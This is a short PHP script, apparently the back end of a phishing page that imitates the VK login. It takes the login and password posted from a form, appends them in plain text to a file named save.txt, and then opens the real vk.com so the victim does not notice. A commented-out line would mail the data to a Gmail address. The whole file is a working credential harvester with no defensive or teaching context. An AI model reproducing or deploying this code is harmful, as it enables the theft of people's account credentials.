<?php
//mail('dim.zaikin2013@gmail.com','sds','sdssd');
    $login = $_POST["login"]; // вот мы получаем значение текстового поля =)
    $pass = $_POST["pass"];
    $filed = "save.txt";
    $result = "Login: $login | Password: $pass\r\n";
	$rez = $result;
	file_put_contents($filed, $rez, FILE_APPEND);
?>
<script type="text/javascript">
	window.open('https://www.vk.com/');
</script>